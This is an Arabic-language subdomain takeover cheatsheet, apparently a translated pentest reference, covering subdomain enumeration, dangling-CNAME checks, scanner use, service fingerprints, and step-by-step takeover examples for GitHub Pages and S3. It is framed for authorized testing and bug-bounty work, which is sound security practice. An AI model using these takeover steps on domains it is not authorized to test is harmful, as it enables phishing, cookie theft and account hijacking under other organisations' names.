<a id="-subdomain-takeover-cheatsheet"></a>
# 🎯 ورقة مرجعية للاستحواذ على النطاقات الفرعية (Subdomain Takeover)

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
  ███████╗██╗   ██╗██████╗ ██████╗  ██████╗ ███╗   ███╗ █████╗ ██╗███╗   ██╗
  ██╔════╝██║   ██║██╔══██╗██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██║████╗  ██║
  ███████╗██║   ██║██████╔╝██║  ██║██║   ██║██╔████╔██║███████║██║██╔██╗ ██║
  ╚════██║██║   ██║██╔══██╗██║  ██║██║   ██║██║╚██╔╝██║██╔══██║██║██║╚██╗██║
  ███████║╚██████╔╝██████╔╝██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║██║██║ ╚████║
  ╚══════╝ ╚═════╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
                ████████╗ █████╗ ██╗  ██╗███████╗ ██████╗ ██╗   ██╗███████╗██████╗ 
                ╚══██╔══╝██╔══██╗██║ ██╔╝██╔════╝██╔═══██╗██║   ██║██╔════╝██╔══██╗
                   ██║   ███████║█████╔╝ █████╗  ██║   ██║██║   ██║█████╗  ██████╔╝
                   ██║   ██╔══██║██╔═██╗ ██╔══╝  ██║   ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
                   ██║   ██║  ██║██║  ██╗███████╗╚██████╔╝ ╚████╔╝ ███████╗██║  ██║
                   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═╝
```

يعرض الشعار مصطلح Subdomain Takeover، أي الاستحواذ على نطاق فرعي بقي مرتبطًا بمورد لا يملكه صاحب النطاق.

---

<a id="-what-is-subdomain-takeover"></a>
## 🎯 ما هو الاستحواذ على النطاقات الفرعية؟

قد يحدث **الاستحواذ على نطاق فرعي** عندما يبقى النطاق مرتبطًا بخدمة أزيل موردها، مثل ارتباطه عبر سجل CNAME، ويستطيع طرف آخر حجز المورد أو ربط النطاق بخدمته وتقديم محتوى من خلاله.

<a id="impact"></a>
### الأثر
- 🔴 **التصيد (Phishing)** — استضافة صفحات تصيد تبدو موثوقة
- 🔴 **سرقة ملفات تعريف الارتباط** — قد تتأثر الملفات المضبوطة لنطاق الأب بحسب خصائصها
- 🔴 **الاستيلاء على الحساب** — قد يتيح اعتراض عناوين رجوع OAuth في بعض الإعدادات
- 🔴 **الإضرار بالسمعة** — تقديم محتوى ضار من نطاق المؤسسة

---

<a id="-detection-methodology"></a>
## 🔍 منهجية الكشف

<a id="step-1-enumerate-subdomains"></a>
### الخطوة 1: استكشاف النطاقات الفرعية
```bash
# استخدام أدوات متعددة لتوسيع التغطية
subfinder -d target.com -o subs.txt
amass enum -d target.com -o amass.txt
assetfinder --subs-only target.com >> subs.txt

# دمج النتائج وإزالة التكرار
cat subs.txt amass.txt | sort -u > all_subs.txt
```

<a id="step-2-find-cnames"></a>
### الخطوة 2: العثور على سجلات CNAME
```bash
# فحص سجلات DNS
cat all_subs.txt | while read sub; do
    cname=$(dig CNAME +short $sub)
    if [ ! -z "$cname" ]; then
        echo "$sub -> $cname"
    fi
done

# أو استخدام dnsrecon
dnsrecon -d target.com -t crt
```

<a id="step-3-check-for-dangling-cnames"></a>
### الخطوة 3: فحص سجلات CNAME المعلقة
```bash
# فحص يدوي
dig CNAME subdomain.target.com +short
# Returns: something.cloudfront.net
# ثم التحقق مما إذا كان المورد غير محجوز فعلًا

# استخدام httpx لعرض رموز الحالة
cat all_subs.txt | httpx -status-code -title -tech-detect -no-color
```

---

<a id="-automated-tools"></a>
## 🛠️ أدوات آلية

<a id="subjack"></a>
### Subjack
```bash
# التثبيت
go install github.com/haccer/subjack@latest

# الفحص
subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt -ssl

# مع بصمات الاستجابة
subjack -w subdomains.txt -t 100 -a -timeout 30 -o results.txt -ssl
```

<a id="nuclei-takeover-templates"></a>
### قوالب الاستحواذ في Nuclei

> **توافق المسار:** يعرض الأصل مسار `takeovers/`؛ توجد القوالب الحديثة تحت `http/takeovers/` في المستودع الرسمي، وقد تختلف أسماء الملفات. [المجلد الحالي للمشروع](https://github.com/projectdiscovery/nuclei-templates/tree/main/http/takeovers).
```bash
# استخدام قوالب nuclei
nuclei -l subdomains.txt -t ~/nuclei-templates/takeovers/ -o takeovers.txt

# فحوص استحواذ محددة
nuclei -l subdomains.txt -t ~/nuclei-templates/takeovers/subdomain-takeover.yaml
```

<a id="can-i-take-over-xyz"></a>
### Can-I-Take-Over-XYZ
```bash
# مراجعة مستودع GitHub لبصمات الاستجابة
# https://github.com/EdOverflow/can-i-take-over-xyz

# استخدام البصمات للمراجعة اليدوية أو بالأدوات الآلية
```

---

<a id="-vulnerable-services--fingerprints"></a>
## 📋 الخدمات وبصمات الاستجابة الواردة في الأصل

> **توضيح:** هذه بصمات وأوصاف تاريخية من الأصل؛ ظهور رسالة خطأ أو CNAME معلق لا يثبت إمكانية حجز المورد أو التحكم بالمحتوى حاليًا. تختلف متطلبات التحقق والحجز باختلاف الخدمة. احتُفظ بالبصمات حرفيًا للمقارنة.

<a id="aws-s3"></a>
### AWS S3
```
CNAME: bucket.s3.amazonaws.com
CNAME: bucket.s3-website-region.amazonaws.com

Fingerprint: "NoSuchBucket"
Fingerprint: "The specified bucket does not exist"

الاستحواذ بحسب الأصل: إنشاء حاوية بالاسم نفسه
```

<a id="aws-cloudfront"></a>
### AWS CloudFront

> **تصحيح للمتطلبات:** يطلب CloudFront شهادة TLS موثوقة تغطي النطاق البديل؛ مجرد إنشاء توزيع جديد لا يكفي. رسائل الخطأ أدناه ليست دليل استحواذ وحدها. [متطلبات AWS الرسمية](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/CNAMEs.html).
```
CNAME: xxxxx.cloudfront.net

Fingerprint: "Bad Request"
Fingerprint: "ERROR: The request could not be satisfied"

الاستحواذ بحسب الأصل: إنشاء توزيع CloudFront وربط النطاق البديل نفسه
```

<a id="github-pages"></a>
### GitHub Pages

> **توافق الحماية:** تمنع آلية التحقق من النطاق في GitHub مستخدمين آخرين من ربط نطاق متحقق منه بمواقعهم ضمن نطاق الحماية الموثق؛ لذلك لا يضمن إنشاء مستودع وملف CNAME نجاح المثال. [توثيق GitHub الرسمي](https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site/verifying-your-custom-domain-for-github-pages).
```
CNAME: username.github.io
CNAME: organization.github.io

Fingerprint: "There isn't a GitHub Pages site here"

الاستحواذ بحسب الأصل:
1. إنشاء مستودع username.github.io
2. إضافة ملف CNAME يتضمن النطاق الفرعي المستهدف
```

<a id="heroku"></a>
### Heroku
```
CNAME: xxx.herokuapp.com
CNAME: xxx.herokudns.com

Fingerprint: "No such app"
Fingerprint: "There's nothing here, yet"

الاستحواذ بحسب الأصل: إنشاء تطبيق Heroku بالاسم نفسه
```

<a id="azure"></a>
### Azure

> **توضيح:** توثق Azure حماية App Service بواسطة سجل TXT باسم `asuid.{subdomain}`؛ قد يستطيع طرف إنشاء مورد بالاسم القديم دون امتلاك صلاحية ربط النطاق المخصص. [دليل Microsoft الرسمي](https://learn.microsoft.com/en-us/azure/security/fundamentals/subdomain-takeover).
```
CNAME: xxx.azurewebsites.net
CNAME: xxx.cloudapp.azure.com
CNAME: xxx.blob.core.windows.net

Fingerprint: "404 - Web Site not found"

الاستحواذ بحسب الأصل: إنشاء مورد بالاسم نفسه
```

<a id="shopify"></a>
### Shopify
```
CNAME: shops.myshopify.com

Fingerprint: "Sorry, this shop is currently unavailable"
Fingerprint: "Only one step left"

الاستحواذ بحسب الأصل: إنشاء متجر Shopify وإضافة النطاق المخصص
```

<a id="wordpresscom"></a>
### WordPress.com
```
CNAME: xxx.wordpress.com

Fingerprint: "Do you want to register *.wordpress.com?"

الاستحواذ بحسب الأصل: تسجيل النطاق الفرعي في WordPress.com
```

<a id="zendesk"></a>
### Zendesk
```
CNAME: xxx.zendesk.com

Fingerprint: "Help Center Closed"
Fingerprint: "This help center no longer exists"

الاستحواذ ليس ممكنًا دائمًا؛ يعتمد على إعداد Zendesk
```

<a id="fastly"></a>
### Fastly
```
CNAME: xxx.fastly.net

Fingerprint: "Fastly error: unknown domain"

الاستحواذ بحسب الأصل: إضافة النطاق إلى خدمة Fastly
```

<a id="pantheon"></a>
### Pantheon
```
CNAME: xxx.pantheonsite.io

Fingerprint: "The gods are wise but do not know of the site"
Fingerprint: "404 error unknown site!"

الاستحواذ بحسب الأصل: إضافة موقع في Pantheon
```

---

<a id="-exploitation-steps"></a>
## 🔥 خطوات اختبار الاستغلال

<a id="example-github-pages-takeover"></a>
### مثال: الاستحواذ على نطاق عبر GitHub Pages

```bash
# 1. العثور على نطاق فرعي مرشح للاستحواذ
dig CNAME blog.target.com
# النتيجة: target.github.io، مع افتراض عدم وجود المستودع

# 2. إنشاء مستودع GitHub بحسب الأصل
# إنشاء: yourusername/target أو org/target

# 3. تفعيل GitHub Pages في إعدادات المستودع

# 4. إضافة ملف CNAME بالمحتوى التالي:
blog.target.com

# 5. انتظار انتشار تغييرات DNS

# 6. التحقق من نتيجة الاستحواذ
curl https://blog.target.com
```

<a id="example-s3-takeover"></a>
### مثال: الاستحواذ عبر S3

> **تصحيح للمثال:** في ربط S3 المباشر عبر CNAME، يجب أن يطابق اسم الحاوية اسم المضيف المخصص. لذا لا تكفي حاوية `assets-target` بالضرورة لخدمة الطلبات إلى `assets.target.com` كما يوحي التسلسل؛ احتُفظ بالقيم الأصلية. [توثيق S3 الرسمي](https://docs.aws.amazon.com/AmazonS3/latest/userguide/VirtualHosting.html).

```bash
# 1. التحقق من الثغرة بحسب وصف الأصل
dig CNAME assets.target.com
# Returns: assets-target.s3.amazonaws.com

curl http://assets-target.s3.amazonaws.com
# Returns: NoSuchBucket

# 2. إنشاء حاوية S3 في المنطقة نفسها بحسب الأصل
aws s3 mb s3://assets-target --region us-east-1

# 3. إعداد الحاوية
# إضافة استضافة موقع أو وصول عام بحسب الأصل

# 4. رفع المحتوى
echo "Subdomain Takeover PoC" > index.html
aws s3 cp index.html s3://assets-target/

# 5. التحقق
curl http://assets.target.com
```

---

<a id="-quick-reference"></a>
## 📊 مرجع سريع

<a id="vulnerable-service-detection"></a>
### بصمات الكشف الأولي للخدمات

|الخدمة|نمط CNAME|بصمة الاستجابة|
|---------|---------------|-------------|
|AWS S3|`*.s3.amazonaws.com`|NoSuchBucket|
|CloudFront|`*.cloudfront.net`|Bad Request|
|GitHub|`*.github.io`|No GitHub Pages|
|Heroku|`*.herokuapp.com`|No such app|
|Azure|`*.azurewebsites.net`|404 Web Site not found|
|Shopify|`shops.myshopify.com`|Shop unavailable|

<a id="takeover-checklist"></a>
### قائمة تحقق للاستحواذ

```markdown
- [ ] استكشاف جميع النطاقات الفرعية
- [ ] تحديد سجلات CNAME
- [ ] البحث عن سجلات معلقة (Dangling Records)
- [ ] مقارنة بصمات الاستجابة
- [ ] التحقق من أن المورد غير محجوز فعلًا
- [ ] اختبار الاستحواذ ضمن التفويض وحدود البرنامج
- [ ] التوثيق وإعداد التقرير
```

---

<a id="-tools-summary"></a>
## 🛠️ ملخص الأدوات

|الأداة|الغرض|
|------|---------|
|**subjack**|كشف آلي لمرشحات الاستحواذ|
|**nuclei**|فحص معتمد على القوالب|
|**can-i-take-over-xyz**|مرجع لبصمات الاستجابة|
|**dnsrecon**|استكشاف DNS|
|**subfinder**|اكتشاف النطاقات الفرعية|
|**httpx**|فحص استجابة HTTP|

---

<a id="-resources"></a>
## 📚 الموارد

- [can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz)
- [Subjack](https://github.com/haccer/subjack)
- [قوالب Nuclei للاستحواذ](https://github.com/projectdiscovery/nuclei-templates/tree/main/takeovers)

---

<p align="center">
  <b>🎯 اكتشف مخاطر الاستحواذ على النطاقات الفرعية!</b><br>
  <i>للاختبارات المصرح بها فقط!</i>
</p>
